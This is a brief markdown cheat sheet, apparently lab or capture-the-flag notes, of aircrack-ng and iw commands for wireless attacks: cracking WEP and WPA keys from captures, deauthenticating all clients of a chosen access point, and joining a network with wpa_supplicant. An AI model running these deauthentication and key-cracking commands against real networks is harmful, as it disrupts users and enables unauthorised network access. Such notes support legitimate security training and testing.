# WEP networks

Finding WEP networks in pcap file
`airodump-ng -r WEP-Cracking.cap`

Crack WEP
`aircrack-ng -b <bssid> WEP-Cracking.cap`

# WPA networks

List available wifi interfaces on machine
`iw dev`
View available wifi networks on interface
`airodump-ng wlan0`
Select network to and output to file
`airodump-ng wlan0 -c <channel> -w <outputfile>`
Perform deauth attack on selected network for all clients
`aireplay-ng -0 100 -a <bssid> wlan0`
Crack WPA
`aircrack-ng -w <wordlist> <pcap>`

## WPA supplicant conf

```
network={
ssid="NewGenAirways"
scan_ssid=1
key_mgmt=WPA-PSK
psk="password"
}
```

Run supplicant on interface 1
`wpa_supplicant -B -Dnl80211 -iwlan1 -c supplicant.conf`

Get ip address on that interface
`dhclient -v wlan1`

# iw

Putting interface into monitor mode
`iw dev wlan0 setup monitor none`

```
sudo ip link set wlp1s0 down
sudo iw wlp1s0 set monitor none
sudo ip link set wlp1s0 up
```

Get amount of interfaces on 5Ghz band
`iw list`

Scanning 5ghz and 2.4ghz
`airodump-ng wlan0 -b ba`
